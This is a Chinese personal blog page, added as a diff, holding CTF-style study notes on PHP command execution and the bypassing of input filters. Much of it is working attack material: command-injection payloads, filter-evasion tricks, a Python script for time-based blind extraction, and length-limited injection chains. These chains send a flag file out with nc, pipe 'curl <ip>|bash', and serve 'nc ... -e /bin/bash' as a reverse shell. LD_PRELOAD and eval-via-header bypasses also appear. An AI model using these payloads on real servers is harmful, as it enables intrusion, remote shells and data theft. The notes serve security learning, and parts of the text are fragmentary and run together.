@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——PHP命令执行 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——PHP命令执行`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="http://example.com/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"ISCTF 复现","path":"2026/01/16/ISCTF-复现/"},{"title":"Kali渗透Windows服务器","path":"2026/04/01/Kali渗透Windows服务器/"},{"title":"NSSCTF","path":"2026/03/21/NSSCTF/"},{"title":"PHP伪协议","path":"2026/04/02/PHP伪协议/"},{"title":"PHP反序列化","path":"2026/04/06/PHP反序列化/"},{"title":"SSTI","path":"2026/04/30/SSTI/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"ctfplus","path":"2026/03/17/ctfplus/"},{"title":"php","path":"2025/10/05/php/"},{"title":"pikachu","path":"2026/07/09/pikachu/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"sqlmap","path":"2026/03/30/sqlmap/"},{"title":"upload","path":"2026/01/25/upload/"},{"title":"web1","path":"2026/05/09/web1/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"文件包含","path":"2026/04/12/文件包含/"},{"title":"极客大挑战2025 web复现","path":"2026/01/16/极客大挑战2025-web复现/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"},{"title":"PHP命令执行","path":"2026/04/22/PHP命令执行/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">10Day</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">Fa</span>
+          <span class="main-left--tag">Fu</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“fa”</p>
+        <p>“fu”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/Lin060807/Lin060807.github.io.git"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>0</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>9 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>20 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>7277天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">PHP命令执行</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-04-22 23:29:39</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h2 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h2><p>怎么运行，运行条件，参数，能否回显</p>
+<h1 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h1><p>system($command (命令并且输出结果)，如果外部命令执行后的返回状态会被设置到此变量)</p>
+<h1 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h1><p>exec($command(要执行的命令，单独使用只有最后一行结果，不回显)，$array(命令执行的输出填充数组))<br>用print_r输出 print_r($array)</p>
+<h1 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h1><p>passthru($command(要执行的命令并且回显))</p>
+<h1 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h1><p>shell_exec($cmd)<br>借助echo，print输出回显</p>
+<h1 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;"></a>反引号&#96;</h1><p>反引号包裹执行程序指令<br>无回显，需要借助echo，print输出回显</p>
+<h1 id="popen函数"><a href="#popen函数" class="headerlink" title="popen函数"></a>popen函数</h1><p>popen($command,$mode(模式‘r’&#x2F;‘w’))<br>先用fgets&#x2F;fread获取内容，再用print_r&#x2F;echo回显</p>
+<h1 id="proc-open函数"><a href="#proc-open函数" class="headerlink" title="proc_open函数"></a>proc_open函数</h1><p>proc_open($command,$descriptor_spec(定义数组内容),$pipes(调用数组内容))<br>echo stream_get_contents($pipes[1] 1是输出内容</p>
+<h1 id="pcntl-exec函数"><a href="#pcntl-exec函数" class="headerlink" title="pcntl_exec函数"></a>pcntl_exec函数</h1><p>pcntl_exec($path)</p>
+<h2 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h2><p>preg_match函数，只要匹配上了里面的字符串就会直接到else<br>被过滤可以使用其他函数代替</p>
+<h2 id="LD-PRELOAD绕过原理"><a href="#LD-PRELOAD绕过原理" class="headerlink" title="LD_PRELOAD绕过原理"></a>LD_PRELOAD绕过原理</h2><p>当函数禁止很多时可以使用</p>
+<h1 id="程序的链接"><a href="#程序的链接" class="headerlink" title="程序的链接"></a>程序的链接</h1><p>静态链接：程序运行之前将各个目标模块以及所需要的库函数链接成一个完整可执行程序，不在拆开。<br>动态链接：边装入边链接，假如程序动态加载的函数是恶意的，可能导致禁止函数失效被绕过</p>
+<h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p>mail 内嵌在PHP里</p>
+<?php
+putenv("LD_PRELOAD=./demo.so");  加载动态链接库demo.so
+mail('','','','');
+>
+
+绕过条件 
+能够上传自己的.so文件
+能控制环境变量，比如putenv函数未被禁止
+
+调用子程序“/usr/sbin/sendmail
+调用动态链接库geteuid函数
+
+imagick 需要扩展安装
+
+## 蚁剑和pcntl绕过函数过滤
+
+在蚁剑选择LD_PRELOAD等模式点击开始
+
+# pcntl_exec函数
+
+需要单独加载组件
+pcntl_exec($path,$args,$envs) 无回显
+$path="/bin/bash"
+$args=以数组形式包裹 -c执行二进制文件 nc反弹tcp连接到kali，，kali监听端口
+
+## 操作系统链接符
+
+if(isset($cmd)){
+  system("ls".$cmd);
+}
+
+想执行的命令不加ls时
+
+# ;
+
+分号可以将前面和后面的命令分开，相独立
+输入?cmd=;cat flag.php 查看源码发现flag
+
+# &
+
+要进行URL编码
+?cmd=%26id
+
+# &&
+
+前面的命令执行成功后面的才能执行
+
+# |
+
+将前面命令的输出作为后面命令的输入
+“ls -l”|/bin/bash
+把ls -l当成/bin/bash的参数执行
+
+# ||
+
+前面成功不执行后面，前面失败则执行后面
+
+## 空格绕过
+
+preg_replace函数
+preg_replace("# #","",$cmd)
+检查$cmd参数里有没有空格，有就替换为第二个（“”即删除）
+
+绕过方法
+
+# 大括号
+
+{cat,flag.txt}第一个为命令，第二个为参数
+
+# $IFS
+
+内部字段分隔符
+$IFS、${IFS}、$IFS$9
+
+# 重定向字符<,<>
+
+<表示输入重定向的意思，把<后面跟的文件取代键盘作为新的输入设备 1 cat<flag.php 输入flag.php文件里的内容 # url编码 %09 ## 文件名过滤绕过 if(!pre_match(" flag|system|php i",$cmd)) 过滤了flag|system|php ？* 绕过 ？代表单个字符串，*代表任何字符串 单引号，双引号绕过 fl""ag.ph""p 反斜杠 将特殊字符去掉功能，只表示字符串 f lag.p hp 特殊变量：$1-$9、$@、$* fl$1ag.p$9hp fl$*\ag.php 内联字符串 自定义字符串再拼接起来 a="f;d=ag;c=l;cat" $a$c$d.txt ?cmd="passthru('a=f;d=ag;c=l;cat" $a$c$d'); 利用linux中的环境变量 echo $path 使用环境变量里的字符执行变量 f${path:5:1} 在输出的环境变量path里第五个字符（从0开始计数取1个）取到l， 最后构造echo f${path:5:1}${path:8:1}${path:66:1}.{path:93:1}h{path:93:1}等，一直取到flag.php f${path:5:1}${path:8:1}${path:66:1}.{path:93:1}h{path:93:1}'); 文件读取绕过 flag|php|cat|sort|shell|\' 绕过方法 tac 当cat被禁止 反向显示（倒数行数会变成前几行，从最后一行开始往前显示） more less 与cat作用相似，一次显示一页，查看网页源代码 tail 查看末尾几行 nl uniq nl与cat作用相同，前面多加行号，查看源代码 uniq与cat作用相同，报告或删除文件中重复内容 od xxd 以二进制方式读取内容 od在后面加上od -a d -c即可将二进制内容变成正常，xxd可直接读取 sort 排序文件，过滤了可以输入sort\ file -f 报错出具体内容，查看网页源代码 grep 在文本中查找特定字符串 { fla*")； 意思是从fla*中查找{ 文件中出现{的字符串 编码绕过 base64编码 base32编码 将cat flag.php进行base64编码，输入echo （base64编码结果)｜base64 -d ｜ bash 会将前面的编码当作参数给后面的指令，于是进行base64解码，然后将cat flag.php放入bash 执行命令 `echo -d` (echo -d) hex编码 "(hex编码结果)"｜xxd -r -p 执行命令用bash、sh、 bin bash、反引号 shellcode编码 用printf来输出，echo无法用 执行命令用system $()、反引号 无回显时间盲注 页面没有回显可尝试命令盲注，根据返回时间判断 sleep 返回时间 akw nr 返回 eg. cat flag.php awk 输出flag.php文件的第一行 -c 输出第一行的第一个字符 if [2>1];then echo "right";fi
+if 里面的执行为真则执行then echo "right"，否则执行fi结束
+if [$(cat flag.php ｜ awk NR==1｜cut -c 1)==a];then sleep 2;fi
+可以用py脚本(url、cmd参数、命令要进行调整)
+命令可以先变成ls，查看当前目录下的文件，之后再查看文件内容
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://192.168.1.6:18080/class08/1.php&quot;</span><br><span class="line"><span class="keyword">result</span> <span class="operator">=</span> &quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">5</span>):#第i行</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">55</span>):#第j列</span><br><span class="line">        #k为ascii码</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k<span class="operator">=</span>chr(k)</span><br><span class="line">            #time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            payload <span class="operator">=</span> &quot;?cmd=&quot; <span class="operator">+</span> f&quot;if [ `cat flag.php | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi&quot;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url<span class="operator">=</span>url<span class="operator">+</span>payload, timeout<span class="operator">=</span>(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">=</span> <span class="keyword">result</span> <span class="operator">+</span> k</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> &quot; &quot;</span><br></pre></td></tr></table></figure>
+
+## 长度过滤绕过
+
+相关命令
+1.>和>>
+>创建文件
+ >a 创建一个文件a
+ echo "benben">a 将benben写入文件a
+ echo "dazhuang">a 将dazhuang覆盖benben写入a
+ >>追加内容
+  echo "benben">a
+  echo "dazhuang">>a
+  会输出
+  benben
+  dazhuang
+2.\
+  在没写完的命令后面加\可以将一条命令写多行
+  cat a
+  可以变成
+  c\
+  a\
+  t\
+   a
+3.ls -t命令
+  文件排列顺序由近及远
+  已经拼接好的文件名输入到一个文件里面作为文件内容，之后执行文件
+  将文件名变成
+  ag
+  fl\\
+  t\\
+  ca\\
+  ls -t >a
+  sh a 执行文件a的内容
+4.dir
+  dir作用和ls相似，但输出文件不换行
+  dir * 
+  会将文件中第一个文件名当成命令执行，第二个文件名当作参数
+  $(dir *)
+
+5.rev
+  反转文件内容
+# 长度限制为7的绕过方式
+
+cat flag |nc ip地址 监听端口
+cat flag |nc 192.168.1.161 7777
+nc反弹shell交互页面
+1.创建文件名
+一个个输入
+倒序方式
+ ?cmd=>7777
+ ?cmd=>\ \\
+ ?cmd=>>161\\
+ ?cmd=>1.\\
+ ?cmd=>168.\\
+ ?cmd=>192.\\
+ ?cmd=>c\ \\
+ ?cmd=>\|n\\
+ ?cmd=>flag\\
+ ?cmd=>t\ \\
+ ?cmd=>ca\\
+ 
+2.建立一个文件放文件名
+ ?cmd=ls -t>a
+ 打开监听
+ nc -lvp 7777
+3.执行文件内容
+ sh a 
+
+py脚本
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf<span class="number">-8</span></span><br><span class="line">import <span class="type">time</span></span><br><span class="line">import requests</span><br><span class="line">baseurl <span class="operator">=</span> &quot;http://192.168.1.6:19080/class09/2/index.php?cmd=&quot;</span><br><span class="line">s <span class="operator">=</span> requests.session()</span><br><span class="line"></span><br><span class="line">list<span class="operator">=</span>[</span><br><span class="line">    <span class="string">&#x27;&gt;7777&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;&gt;ca\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ls -t&gt;a&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url <span class="operator">=</span> baseurl<span class="operator">+</span>str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl<span class="operator">+</span>&quot;sh a&quot;)</span><br></pre></td></tr></table></figure>
+
+# 长度限制为5的绕过方式
+
+构造命令 curl 192.168.1.161|bash
+
+touch index.html
+vim index.html 
+写入文件内容为
+nc 192.168.1.161 7777 -e /bin/bash
+创建http服务 python -m http.server 80
+nc -lvp 7777 监听端口
+运行py脚本
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#encoding:utf<span class="number">-8</span></span><br><span class="line">import requests</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">baseurl <span class="operator">=</span> &quot;http://192.168.1.6:18080/class09/3/index.php?cmd=&quot;</span><br><span class="line">s <span class="operator">=</span> requests.session()</span><br><span class="line"></span><br><span class="line"># 第一部分：构造 ls <span class="operator">-</span>t 相关命令，写入文件</span><br><span class="line">list<span class="operator">=</span>[</span><br><span class="line">    &quot;&gt;ls\\&quot;,</span><br><span class="line">    &quot;ls&gt;_&quot;,</span><br><span class="line">    &quot;&gt;_\\&quot;,</span><br><span class="line">    &quot;&gt;t\\&quot;,</span><br><span class="line">    &quot;&gt;\\&gt;y&quot;,</span><br><span class="line">    &quot;ls&gt;&gt;_&quot;,</span><br><span class="line">    # 图片中后续可见的补充</span><br><span class="line">    &quot;&gt;1\\&quot;,</span><br><span class="line">    &quot;&gt;2\\&quot;,</span><br><span class="line">    &quot;&gt;19\\&quot;,</span><br><span class="line">    &quot;&gt;_\\&quot;,</span><br><span class="line">    &quot;&gt;rl\\&quot;,</span><br><span class="line">    &quot;&gt;cu\\&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 第二部分：构造 curl 反弹命令，写入文件</span><br><span class="line">list2<span class="operator">=</span>[</span><br><span class="line">    &quot;&gt;bash&quot;,</span><br><span class="line">    &quot;&gt;\\\\&quot;,</span><br><span class="line">    &quot;&gt;\\\\&quot;,</span><br><span class="line">    &quot;&gt;61\\&quot;,</span><br><span class="line">    &quot;&gt;1\\&quot;,</span><br><span class="line">    &quot;&gt;1.\\&quot;,</span><br><span class="line">    &quot;&gt;8.\\&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 执行第一部分命令</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url <span class="operator">=</span> baseurl<span class="operator">+</span>str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"># 执行第二部分命令（图中选中的部分）</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url <span class="operator">=</span> baseurl<span class="operator">+</span>str(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"># 最后执行拼接好的命令文件</span><br><span class="line">s.get(baseurl<span class="operator">+</span>&quot;sh _&quot;)</span><br><span class="line">s.get(baseurl<span class="operator">+</span>&quot;sh y&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+cat flag
+
+# 长度限制为4的绕过方式
+
+## 无参数
+
+# 命令执行请求头绕过
+
+[^\W]+\((?R)?\)
+[^\W]匹配字母、数字、下划线
+[^\W]+\(?\)匹配到a()，()内无参数
+(?R)代表递归
+[^\W]+\((?R)?\)代表a(b(c()))
+
+getallheaders()函数/apache_request_headers()（服务器用apache搭建时）
+end()第一个请求头
+可用print_r(getallheaders())查看请求头
+print_r(pos(getallheaders()))输出最后一个请求头，在bp中将最后一个请求头的参数修改为system('ls'),并且将输出改为eval，则会将请求头中的参数当成命令执行
+# 全局变量REC
+
+get_defined_vars()函数返回所以已定义变量的值所组成的数组
+&后面加入想要获取的指令?code=print_r(pos(get_defined_vars()));&cmd=system('ls');会返回两个数组code和cmd
+为了只返回cmd，于是将命令变成?code=print_r(end(pos(get_defined_vars())));&cmd=system('ls');
+将print_r变成eval
+
+# 利用session
+
+session_start()函数启动新会话或者重用现有会话，成功开始会话返回TRUE，失败返回False
+?code=session_id(session_start());返回session_id的值
+输入?code=show_source(session_id(session_start())); 用bp修改session_id的值为./flag，用show_source读取flag文件源码
+或者?code=eval(hex2bin(session_id(session_start())));
+session_id参数要HEX编码转为16进制
+
+
+# scandir读取
+
+scandir()将当前所有目录下的文件以数组的形式
+getcwd()返回当前页面所在的目录路径
+current()输出数组里面第一个值
+next()暑促当前指针所指的下一个值
+array_reverse()倒序
+array_flip()对换数组中键和值
+array_rand()数组随机取出键
+strrev()反转给定的字符串
+crypt()加密
+dirname()上一级目录
+chdir()改变当前工作目录
+localeconv()显示数组第一项为.
+
+查看当前目录下的文件
+?code=print_r(scandir(current(localeconv()));
+如果flag文件在最后一个可以使用并读取文件内容
+?code=show_source(array_reverse(scandir(current(localeconv()))));
+
+查看当前目录文件
+?code=print_r(getcwd());
+?code=print_r(scandir(getcwd()));
+?code=show_source(end(scandir(getcwd())));
+
+查看上级目录文件
+?code=print_r(dirname(getcwd()));
+chdir修改当前文件目录，使得之后的命令执行都在当前目录
+?code=print_r(chdir(dirname(getcwd())));
+?code=print_r(dirname(chdir(dirname(getcwd()))));
+?code=print_r(scandir(dirname(chdir(dirname(getcwd())))));
+?code=show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));
+
+想要的文件不是第一个和最后一个有可能读出我们想要的
+?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
+
+根目录
+?code=print_r(array());
+?code=print_r(serialize(array()));
+?code=print_r(crypt(serialize(array())));
+一直生成直到生成的字符串里面包含'/'
+当\出现在最后一个的时候，可以进行反转
+?code=print_r(strrev(crypt(serialize(array()))));
+只想要第一个字符'/'
+可以使用ord()编码，chr()解码只对第一个编码
+?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));
+之后查看目录下文件
+?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))))）;
+之后用array_rand和array_flip函数随机找到flag文件（可以用bp）
+
+## 无字母数字绕过
+
+# 异或运算
+
+是用符号进行异或，得到想要的值                                                                                                                                                  
